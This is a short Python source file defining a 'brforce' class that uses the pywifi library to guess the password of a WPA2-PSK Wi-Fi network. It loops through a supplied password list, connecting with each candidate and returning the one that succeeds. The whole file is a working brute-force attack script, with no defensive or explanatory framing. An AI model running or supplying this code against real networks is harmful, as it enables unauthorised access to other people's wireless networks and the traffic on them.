from pywifi import *
from time import  sleep

class brforce:
    def __init__(self,ssid,pass_list):
        self.pass_list = pass_list
        self.col_pwf = PyWiFi()
        self.wln_adp = self.col_pwf.interfaces()[0]
        self.ssid = ssid
        self.profile = Profile()
    def getwifi(self):
        self.profile.ssid = self.ssid
        self.profile.auth = const.AUTH_ALG_OPEN
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)
        self.profile.cipher = const.CIPHER_TYPE_CCMP
        for password in self.pass_list:
            print(password)
            self.profile.key = password
            self.wln_adp.remove_all_network_profiles()
            profile_brute = self.wln_adp.add_network_profile(self.profile)
            self.wln_adp.connect(profile_brute)
            sleep(2)
            if self.wln_adp.status() == const.IFACE_CONNECTED:
                return  password
            else:
                pass








